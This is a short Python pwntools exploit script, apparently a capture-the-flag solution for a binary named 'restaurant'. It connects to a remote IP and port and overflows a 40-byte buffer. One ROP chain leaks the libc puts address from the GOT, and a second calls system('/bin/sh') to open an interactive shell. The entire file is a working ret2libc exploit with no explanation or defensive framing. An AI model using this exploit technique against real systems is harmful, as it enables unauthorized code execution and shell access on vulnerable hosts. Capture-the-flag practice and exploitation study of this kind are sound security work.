from pwn import *

context.arch = 'amd64'

r = process('./restaurant')
r = remote('134.122.104.2',31622)
r.sendline(b'1')
elf = ELF('restaurant')
libc = ELF('libc.so.6')
ROP(elf)


overflow = b'A'*40



rop = ROP(elf)

rop.call(elf.plt['puts'], [next(elf.search(b""))])
rop.call(elf.plt['puts'], [elf.got['puts']])
rop.call((rop.find_gadget(["ret"]))[0])
rop.call(elf.symbols['fill'])

payload = overflow + rop.chain()

r.clean()
r.sendline(payload)
r.recvuntil(b"\n")
r.recvuntil(b"\n")
leaked_addr_puts_libc = u64(r.recvuntil(b"\n").strip().ljust(8, b"\x00"))
log.info("Leaked puts address: "+ hex(leaked_addr_puts_libc))
libc.address = leaked_addr_puts_libc - libc.symbols["puts"]
log.info("libc base @ %s" % hex(libc.address))




rop = ROP(libc)
rop.call('puts', [next(libc.search(b"/bin/sh\x00"))])
rop.call('system', [next(libc.search(b"/bin/sh\x00"))])

payload = overflow + rop.chain()
log.info(rop.dump())

r.sendlineafter(b">" ,payload)

r.interactive()

